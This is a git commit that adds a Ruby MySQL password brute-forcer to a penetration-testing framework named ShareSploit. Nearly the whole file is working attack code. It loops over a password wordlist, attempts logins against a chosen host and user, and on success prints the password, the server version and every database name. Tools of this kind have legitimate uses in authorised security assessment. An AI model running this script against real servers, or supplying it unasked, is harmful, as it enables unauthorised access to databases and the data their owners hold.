74e795be0332c2a3cca8ee984ec1fc3a0d3f8969
sharesec <aka19.sharesec@gmail.com>
2016-06-08 20:44:34 +0700

    Create mysql_brute.rb

---
+++ modules/database-assessment/mysql_brute.rb
@@ -0,0 +1,69 @@
+#!/usr/bin/env ruby
+#
+# Module name: MySQL bruteforcer
+#
+# Author: Aris Kurniawan (akaig) - Twitter: @0xffHack
+#
+# This script merged with ShareSploit-Framework/modules
+#
+# This module require 'libmysqlclient-dev' and 'mysql gem'
+#
+
+require 'mysql'
+require 'time'
+require './core/notif'
+
+def banner
+	$app = __FILE__
+	puts "MySQL bruteforcer v1"
+	puts "Written by Aris Kurniawan (akaig) - Follow Twitter @0xffHack"
+	puts ""
+	puts "Usage: ruby #{$app} [user] [host] [path/to/wordlist.txt]"
+	#
+	# Options:
+	#          -u, --user=name     User for login if not current user.
+	#          -h, --host=name     Connect to host.
+	#          -w, --wordlist      Path to password dictionary.
+end
+
+$time = Time.new 
+$user, $host, $lib = ARGV[0], ARGV[1], ARGV[2]
+
+if ARGV.length == 3
+	$wordlist = File.read($lib)
+	query = []
+
+	$wordlist.each_line do |passwd|
+		query << passwd
+	end
+
+	puts Notif.proc+" MySQL bruteforce starting at #{$time}"
+	puts Notif.proc+" Bruteforcing on MySQL user { #{$user}"+"@"+"#{$host} }"
+	sleep 2
+
+	for brute in query
+		begin
+			$attack = brute.chomp!
+			$con = Mysql.real_connect($host, $user, $attack, "information_schema") # <-- default DB request
+			puts Notif.ok+" Login successful using password: "+$attack
+ 			puts Notif.ok+" MySQL database version detected: "+$con.get_server_info
+			puts
+			puts " @databases = {"
+			$con.list_dbs.each do |remote_database|
+			puts "               '"+remote_database+"'"
+			end
+			puts "              };"
+			puts
+			puts Notif.proc+" MySQL bruteforce finished at #{$time}"
+			exit 1
+		rescue Mysql::Error
+			puts Notif.fail+" Login failed using password: "+$attack
+		rescue Interrupt => handle
+		ensure
+			$con.close if $con
+ 		end
+	end
+
+else
+	banner
+end
